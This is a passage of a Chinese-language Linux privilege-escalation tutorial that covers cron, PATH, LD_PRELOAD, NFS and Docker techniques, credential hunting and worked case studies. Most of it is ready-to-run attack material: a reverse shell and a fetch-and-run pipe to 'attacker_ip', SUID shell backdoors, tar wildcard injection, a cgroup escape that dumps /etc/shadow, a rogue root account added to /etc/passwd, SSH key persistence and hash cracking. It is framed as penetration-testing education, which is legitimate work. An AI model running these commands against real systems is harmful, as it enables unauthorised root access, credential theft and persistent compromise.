Cron 是 Linux 的计划任务系统。如果 cron 任务配置不当，可能被利用来提权。

### 7.1 Cron 基础

```bash
# 系统 cron 配置
cat /etc/crontab

# 示例内容:
# SHELL=/bin/bash
# PATH=/sbin:/bin:/usr/sbin:/usr/bin
# 
# * * * * * root /path/to/script.sh
# 分 时 日 月 周 用户 命令

# 查看 cron 目录
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# 用户 cron
crontab -l
cat /var/spool/cron/crontabs/*

# systemd timers
systemctl list-timers --all
```

### 7.2 可写的 Cron 脚本

```bash
# 检查 cron 执行的脚本是否可写
cat /etc/crontab
# 假设有: * * * * * root /opt/scripts/backup.sh

# 检查脚本权限
ls -la /opt/scripts/backup.sh

# 如果可写，添加恶意命令
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/backup.sh

# 等待 cron 执行后
/tmp/bash -p

# 或者添加反弹 shell
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /opt/scripts/backup.sh
```

### 7.3 Cron PATH 劫持

```bash
# 查看 crontab 中的 PATH
cat /etc/crontab
# PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# 如果 cron 任务使用相对路径
# * * * * * root backup.sh

# 并且 PATH 中有可写目录（如 /home/user）
# 创建恶意脚本
echo '#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash' > /home/user/backup.sh
chmod +x /home/user/backup.sh

# 等待执行后
/tmp/bash -p
```

### 7.4 Cron 通配符注入

当 cron 脚本使用通配符（*）时，可能被利用。

```bash
# 假设 cron 任务执行:
# * * * * * root cd /opt/backup && tar -zcf /tmp/backup.tar.gz *

# tar 有一些特殊参数可以执行命令
# --checkpoint=1 --checkpoint-action=exec=sh shell.sh

# 在 /opt/backup 目录创建恶意文件
cd /opt/backup
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# 当 tar 执行时，* 会展开为:
# tar -zcf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...

# 等待执行后
/tmp/bash -p
```

### 7.5 Cron 文件覆写

```bash
# 如果可以写入 /etc/cron.d/ 目录
echo '* * * * * root cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /etc/cron.d/evil

# 或者覆写现有的 cron 文件
```

---

## 8. PATH 环境变量劫持

当程序使用相对路径调用其他命令时，可以通过修改 PATH 环境变量来劫持命令执行。

### 8.1 PATH 劫持基础

```bash
# 查看当前 PATH
echo $PATH

# PATH 劫持原理:
# 如果一个 SUID 程序执行 system("cat /etc/passwd")
# 系统会按 PATH 顺序查找 cat 命令
# 如果我们在 PATH 前面添加一个目录，并放入恶意的 cat
# 就会执行我们的恶意程序
```

### 8.2 识别可劫持的程序

```bash
# 查找 SUID 程序
find / -perm -4000 -type f 2>/dev/null

# 分析程序调用的命令
strings /path/to/suid_program | grep -E "^[a-z]+"
ltrace /path/to/suid_program 2>&1 | grep -E "system|exec"
strace /path/to/suid_program 2>&1 | grep -E "execve"

# 如果看到类似:
# system("service apache2 restart")
# 而不是:
# system("/usr/sbin/service apache2 restart")
# 则可能存在 PATH 劫持
```

### 8.3 PATH 劫持实战

```bash
# 假设发现 SUID 程序 /usr/local/bin/backup
# 它执行 system("tar -czf /tmp/backup.tar.gz /home")

# 步骤 1: 创建恶意 tar
cd /tmp
echo '#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash' > tar
chmod +x tar

# 步骤 2: 修改 PATH
export PATH=/tmp:$PATH

# 步骤 3: 执行 SUID 程序
/usr/local/bin/backup

# 步骤 4: 获取 root shell
/tmp/bash -p

# 另一种方法: 直接获取 shell
echo '#!/bin/bash
/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup
```

### 8.4 共享库劫持 (LD_PRELOAD)

```bash
# 检查程序加载的库
ldd /path/to/program

# 检查 LD_PRELOAD 是否被允许
# 对于 SUID 程序，LD_PRELOAD 通常被忽略
# 但如果程序不是 SUID，或者有特殊配置

# 创建恶意共享库
# evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}

# 编译
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c

# 如果可以设置 LD_PRELOAD
LD_PRELOAD=/tmp/evil.so /path/to/program
```

---

## 9. NFS 提权

NFS（Network File System）配置不当可能导致提权。

### 9.1 NFS 基础

```bash
# 查看 NFS 共享
showmount -e target_ip
cat /etc/exports

# 危险配置:
# /home *(rw,no_root_squash)
# no_root_squash: 允许远程 root 用户保持 root 权限
# 默认是 root_squash，会将远程 root 映射为 nobody
```

### 9.2 no_root_squash 提权

```bash
# 在攻击机上（需要 root）

# 挂载 NFS 共享
mkdir /mnt/nfs
mount -t nfs target_ip:/home /mnt/nfs

# 方法 1: 创建 SUID bash
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# 在目标机上执行
/home/bash -p

# 方法 2: 创建 SUID C 程序
# shell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}

# 在攻击机上编译
gcc shell.c -o /mnt/nfs/shell
chmod +s /mnt/nfs/shell

# 在目标机上执行
/home/shell
```

### 9.3 NFS 版本问题

```bash
# NFSv4 可能有不同的行为
# 检查 NFS 版本
nfsstat -m
rpcinfo -p target_ip

# 挂载时指定版本
mount -t nfs -o vers=3 target_ip:/share /mnt/nfs
```

---

## 10. Docker 逃逸

如果当前用户在 docker 组中，或者在特权容器中，可能可以逃逸到宿主机。

### 10.1 Docker 组提权

```bash
# 检查是否在 docker 组
id
groups

# 如果在 docker 组，可以直接获取 root
# 方法 1: 挂载宿主机根目录
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# 方法 2: 挂载并修改 /etc/passwd
docker run -v /etc:/mnt --rm -it alpine sh
# 在容器中
echo 'hacker:$1$hacker$xxxxx:0:0::/root:/bin/bash' >> /mnt/passwd
# 退出后在宿主机
su hacker

# 方法 3: 挂载并添加 SSH 密钥
docker run -v /root:/mnt --rm -it alpine sh
mkdir -p /mnt/.ssh
echo 'ssh-rsa AAAA...' >> /mnt/.ssh/authorized_keys
# 然后 SSH 登录

# 方法 4: 创建 SUID shell
docker run -v /:/mnt --rm -it alpine sh
cp /mnt/bin/bash /mnt/tmp/bash
chmod +s /mnt/tmp/bash
# 退出后
/tmp/bash -p
```

### 10.2 特权容器逃逸

```bash
# 检查是否在容器中
cat /proc/1/cgroup
ls -la /.dockerenv

# 检查是否是特权容器
cat /proc/self/status | grep CapEff
# 如果是 0000003fffffffff，则是特权容器

# 方法 1: 挂载宿主机磁盘
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# 方法 2: 利用 cgroup release_agent
# 创建 cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# 启用 notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# 获取宿主机路径
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# 设置 release_agent
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 创建要执行的命令
echo '#!/bin/sh
cat /etc/shadow > /output' > /cmd
chmod +x /cmd

# 触发
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 方法 3: 利用 Docker socket
# 如果 /var/run/docker.sock 被挂载到容器中
ls -la /var/run/docker.sock

# 使用 docker 命令
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### 10.3 容器检测

```bash
# 检测是否在容器中
# 方法 1: 检查 .dockerenv
ls -la /.dockerenv

# 方法 2: 检查 cgroup
cat /proc/1/cgroup | grep docker

# 方法 3: 检查进程
ps aux | head

# 方法 4: 检查环境变量
env | grep -i docker
env | grep -i kubernetes

# 方法 5: 检查挂载
mount | grep docker
```

---

## 11. 密码与凭证

### 11.1 密码文件

```bash
# /etc/passwd 可写（罕见但致命）
ls -la /etc/passwd

# 如果可写，添加 root 用户
# 生成密码哈希
openssl passwd -1 -salt hacker password123
# 输出: $1$hacker$xxxxx

# 添加用户
echo 'hacker:$1$hacker$xxxxx:0:0::/root:/bin/bash' >> /etc/passwd

# 登录
su hacker
# 密码: password123

# /etc/shadow 可读
cat /etc/shadow
# 复制哈希，使用 John 或 Hashcat 破解

# 使用 John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# 使用 Hashcat
hashcat -m 1800 -a 0 shadow.txt rockyou.txt
```

### 11.2 配置文件中的密码

```bash
# Web 应用配置
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /var/www/html/.env
cat /var/www/html/configuration.php

# 数据库配置
cat /etc/mysql/debian.cnf
cat /etc/mysql/my.cnf

# 搜索密码
grep -r "password" /var/www/ 2>/dev/null
grep -r "passwd" /etc/ 2>/dev/null
grep -ri "db_password" /var/www/ 2>/dev/null

# 常见密码字段
grep -ri "password\|passwd\|pwd\|secret\|credential" /var/www/ 2>/dev/null
```

### 11.3 历史文件

```bash
# Bash 历史
cat ~/.bash_history
cat /home/*/.bash_history

# 可能包含:
# mysql -u root -p'password'
# ssh user@host -p password
# sshpass -p 'password' ssh user@host

# 其他历史文件
cat ~/.mysql_history
cat ~/.nano_history
cat ~/.vim_history
cat ~/.python_history
cat ~/.psql_history

# 查找所有历史文件
find / -name "*_history" -o -name ".*_history" 2>/dev/null
```

### 11.4 SSH 密钥

```bash
# 查找 SSH 私钥
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# 检查 SSH 目录
ls -la ~/.ssh/
ls -la /home/*/.ssh/
ls -la /root/.ssh/

# 如果找到私钥
chmod 600 id_rsa
ssh -i id_rsa root@localhost

# 检查 authorized_keys（可能可以添加自己的公钥）
cat ~/.ssh/authorized_keys
# 如果可写
echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys
```

### 11.5 密码重用

```bash
# 找到一个密码后，尝试用于其他账户
su root
su admin
su user

# 尝试 SSH
ssh root@localhost
ssh admin@localhost

# 尝试数据库
mysql -u root -p
psql -U postgres
```

---

## 12. 自动化工具

### 12.1 LinPEAS

LinPEAS 是最全面的 Linux 提权枚举脚本。

```bash
# 下载
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# 或者使用 curl
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# 执行
chmod +x linpeas.sh
./linpeas.sh

# 保存输出
./linpeas.sh | tee linpeas_output.txt

# 只运行特定检查
./linpeas.sh -s  # 静默模式
./linpeas.sh -a  # 所有检查
./linpeas.sh -e  # 额外检查
```

### 12.2 LinEnum

```bash
# 下载
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# 执行
chmod +x LinEnum.sh
./LinEnum.sh

# 详细模式
./LinEnum.sh -t

# 保存输出
./LinEnum.sh -r report.txt
```

### 12.3 Linux Exploit Suggester

```bash
# 下载
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# 执行
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# 或者使用 Python 版本
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl
```

### 12.4 pspy

pspy 用于监控进程，可以发现定时任务和其他用户执行的命令。

```bash
# 下载
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

# 执行
chmod +x pspy64
./pspy64

# 32位系统
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32
./pspy32

# 监控一段时间，观察是否有以 root 运行的定时任务
```

### 12.5 GTFOBins 查询

```bash
# GTFOBins 网站: https://gtfobins.github.io/

# 找到 SUID 程序后，在网站上搜索
# 例如找到 /usr/bin/vim 有 SUID
# 搜索 vim，查看 SUID 部分的利用方法

# 常用查询:
# https://gtfobins.github.io/gtfobins/vim/#suid
# https://gtfobins.github.io/gtfobins/find/#suid
# https://gtfobins.github.io/gtfobins/python/#suid
```

### 12.6 工具传输方法

```bash
# 方法 1: HTTP 服务器
# 攻击机
python3 -m http.server 8080
# 目标机
wget http://attacker_ip:8080/linpeas.sh
curl http://attacker_ip:8080/linpeas.sh -o linpeas.sh

# 方法 2: Netcat
# 攻击机
nc -lvp 4444 < linpeas.sh
# 目标机
nc attacker_ip 4444 > linpeas.sh

# 方法 3: Base64
# 攻击机
base64 linpeas.sh > linpeas.b64
# 复制内容到目标机
base64 -d linpeas.b64 > linpeas.sh

# 方法 4: 直接在内存中执行（不落地）
curl http://attacker_ip:8080/linpeas.sh | bash
wget -O - http://attacker_ip:8080/linpeas.sh | bash
```

---

## 13. 实战案例

### 13.1 案例 1: SUID find 提权

```bash
# 场景: 获得了 www-data 用户的 shell

# 步骤 1: 信息收集
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 步骤 2: 查找 SUID 文件
find / -perm -4000 -type f 2>/dev/null
# 发现 /usr/bin/find 有 SUID

# 步骤 3: 验证
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root ... /usr/bin/find

# 步骤 4: 利用
find . -exec /bin/sh -p \; -quit

# 步骤 5: 验证权限
id
# uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
whoami
# root
```

### 13.2 案例 2: Sudo vim 提权

```bash
# 场景: 获得了普通用户 john 的 shell

# 步骤 1: 检查 sudo 权限
sudo -l
# User john may run the following commands:
#     (root) NOPASSWD: /usr/bin/vim

# 步骤 2: 利用 vim 获取 shell
sudo vim -c ':!/bin/sh'

# 或者在 vim 中
sudo vim
:set shell=/bin/sh
:shell

# 步骤 3: 验证
id
# uid=0(root) gid=0(root) groups=0(root)
```

### 13.3 案例 3: Cron 通配符注入

```bash
# 场景: 发现 cron 任务

# 步骤 1: 查看 crontab
cat /etc/crontab
# * * * * * root cd /var/backup && tar -zcf /tmp/backup.tar.gz *

# 步骤 2: 检查目录权限
ls -la /var/backup
# drwxrwxrwx 2 root root ... /var/backup

# 步骤 3: 创建恶意文件
cd /var/backup
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
chmod +x shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# 步骤 4: 等待 cron 执行（最多 1 分钟）
sleep 60

# 步骤 5: 获取 root shell
ls -la /tmp/bash
# -rwsr-sr-x 1 root root ... /tmp/bash
/tmp/bash -p

# 步骤 6: 验证
id
# uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)
```

### 13.4 案例 4: Docker 组提权

```bash
# 场景: 用户在 docker 组中

# 步骤 1: 检查组
id
# uid=1000(user) gid=1000(user) groups=1000(user),999(docker)

# 步骤 2: 利用 docker 挂载宿主机
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# 步骤 3: 现在是宿主机的 root
id
# uid=0(root) gid=0(root) groups=0(root)

# 步骤 4: 持久化（可选）
# 添加 SSH 密钥
mkdir -p /root/.ssh
echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys

# 或创建 SUID shell
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
exit

# 在宿主机上
/tmp/bash -p
```

### 13.5 案例 5: PwnKit 提权

```bash
# 场景: 目标系统未打补丁

# 步骤 1: 检查 pkexec
which pkexec
# /usr/bin/pkexec

# 步骤 2: 下载 exploit
wget http://attacker_ip:8080/PwnKit
chmod +x PwnKit

# 步骤 3: 执行
./PwnKit

# 步骤 4: 验证
id
# uid=0(root) gid=0(root) groups=0(root)
```

### 13.6 案例 6: Capabilities 提权

```bash
# 场景: Python 有 cap_setuid

# 步骤 1: 查找有 capabilities 的文件
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid+ep

# 步骤 2: 利用
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 步骤 3: 验证
id
# uid=0(root) gid=1000(user) groups=1000(user)
```

---

## 14. 常见错误与解决

### 14.1 编译错误

```bash
# 错误: gcc not found
# 解决: 在攻击机上静态编译
gcc -static exploit.c -o exploit

# 错误: 缺少头文件
# 解决: 安装开发包
apt install build-essential
apt install linux-headers-$(uname -r)

# 错误: 架构不匹配
# 解决: 使用正确的架构编译
# 32位
gcc -m32 exploit.c -o exploit
# 64位
gcc -m64 exploit.c -o exploit

# 错误: GLIBC 版本不匹配
# 解决: 静态编译或在相同系统上编译
gcc -static exploit.c -o exploit
```

### 14.2 权限错误

```bash
# 错误: Permission denied
# 可能原因:
# 1. 文件没有执行权限
chmod +x exploit

# 2. 目录不可执行
# 尝试复制到 /tmp
cp exploit /tmp/
cd /tmp
./exploit

# 3. noexec 挂载选项
# 检查挂载选项
mount | grep /tmp
# 如果有 noexec，尝试其他目录
# 或使用解释器执行
/lib64/ld-linux-x86-64.so.2 ./exploit

# 错误: Operation not permitted
# 可能是 SELinux 或 AppArmor
# 检查状态
getenforce
aa-status
```

### 14.3 Exploit 失败

```bash
# 错误: Exploit 执行但没有效果
# 可能原因:
# 1. 内核版本不匹配
uname -r
# 确认 exploit 支持的版本

# 2. 已打补丁
# 检查补丁
apt list --installed | grep -i patch

# 3. 安全机制阻止
# 检查 ASLR
cat /proc/sys/kernel/randomize_va_space
# 检查 SELinux
getenforce
# 检查 AppArmor
aa-status

# 错误: Segmentation fault
# 可能是 exploit 不兼容
# 尝试其他版本的 exploit
# 或检查系统架构
uname -m
file exploit
```

### 14.4 Shell 问题

```bash
# 错误: 获得的 shell 不稳定
# 解决: 升级 shell
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 完整的 shell 升级
# 步骤 1: 获取 PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 步骤 2: 设置终端
export TERM=xterm
export SHELL=/bin/bash

# 步骤 3: 后台挂起
Ctrl+Z

# 步骤 4: 在本地终端
stty raw -echo; fg

# 步骤 5: 重置
reset

# 错误: 命令找不到
# 解决: 设置 PATH
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### 14.5 SUID 提权失败

```bash
# 错误: bash -p 没有保持权限
# 原因: bash 版本问题或配置
# 解决: 使用其他方法

# 方法 1: 复制 bash 并设置 SUID
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p

# 方法 2: 使用 sh
/bin/sh -p

# 方法 3: 使用 C 程序
# shell.c
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}

# 错误: SUID 程序不以 root 运行
# 检查文件所有者
ls -la /path/to/suid
# 确保所有者是 root
```

### 14.6 Docker 提权失败

```bash
# 错误: Cannot connect to Docker daemon
# 原因: Docker 服务未运行或权限问题
# 检查 Docker 状态
systemctl status docker

# 检查 socket 权限
ls -la /var/run/docker.sock

# 错误: 镜像拉取失败
# 解决: 使用本地镜像
docker images
docker run -v /:/mnt --rm -it <local_image> chroot /mnt sh

# 或使用 busybox
docker run -v /:/mnt --rm -it busybox chroot /mnt sh
```

### 14.7 提权检查清单

```
┌─────────────────────────────────────────────────────────────────────┐
│ Linux 提权检查清单                                                   │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ □ 系统信息                                                          │
│   □ 内核版本 (uname -a)                                             │
│   □ 发行版信息 (cat /etc/os-release)                                │
│   □ 已安装补丁                                                      │
│                                                                      │
│ □ 用户信息                                                          │
│   □ 当前用户和组 (id)                                               │
│   □ sudo 权限 (sudo -l)                                             │
│   □ 其他用户                                                        │
│                                                                      │
│ □ SUID/SGID                                                         │
│   □ 查找 SUID 文件                                                  │
│   □ 检查 GTFOBins                                                   │
│                                                                      │
│ □ Capabilities                                                      │
│   □ 查找有 capabilities 的文件                                      │
│                                                                      │
│ □ 计划任务                                                          │
│   □ 检查 crontab                                                    │
│   □ 检查可写脚本                                                    │
│   □ 检查通配符使用                                                  │
│                                                                      │
│ □ 敏感文件                                                          │
│   □ 配置文件中的密码                                                │
│   □ 历史文件                                                        │
│   □ SSH 密钥                                                        │
│   □ /etc/passwd 可写?                                               │
│   □ /etc/shadow 可读?                                               │
│                                                                      │
│ □ 服务和进程                                                        │
│   □ 以 root 运行的服务                                              │
│   □ 可利用的服务版本                                                │
│                                                                      │
│ □ 容器                                                              │
│   □ 是否在 docker 组                                                │
│   □ 是否在容器中                                                    │
│   □ 是否是特权容器                                                  │
│                                                                      │
│ □ 网络                                                              │
│   □ NFS 共享                                                        │
│   □ 内部服务                                                        │
│                                                                      │
│ □ 内核漏洞                                                          │
│   □ 运行 Linux Exploit Suggester                                    │
│   □ 检查已知漏洞                                                    │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 附录

### A. 常用命令速查

```bash
# 信息收集
uname -a                              # 内核版本
id                                    # 当前用户
sudo -l                               # sudo 权限
find / -perm -4000 2>/dev/null        # SUID 文件
getcap -r / 2>/dev/null               # Capabilities
cat /etc/crontab                      # 计划任务

# 文件传输
python3 -m http.server 8080           # 启动 HTTP 服务器
wget http://ip:port/file              # 下载文件
curl http://ip:port/file -o file      # 下载文件

# Shell 升级
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# 密码生成
openssl passwd -1 -salt salt password
```

### B. 重要资源

```
GTFOBins: https://gtfobins.github.io/
LinPEAS: https://github.com/carlospolop/PEASS-ng
Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
HackTricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
```

### C. 内核漏洞 Exploit 仓库

```
https://github.com/SecWiki/linux-kernel-exploits
https://github.com/lucyoa/kernel-exploits
https://github.com/bwbwbwbw/linux-exploit-binaries
```

---

> 最后更新: 2025年1月
> 
> 记住：提权是一个需要耐心和细心的过程。不要急于求成，仔细收集信息，分析每一个可能的攻击面。祝你在合法的安全测试中取得成功！
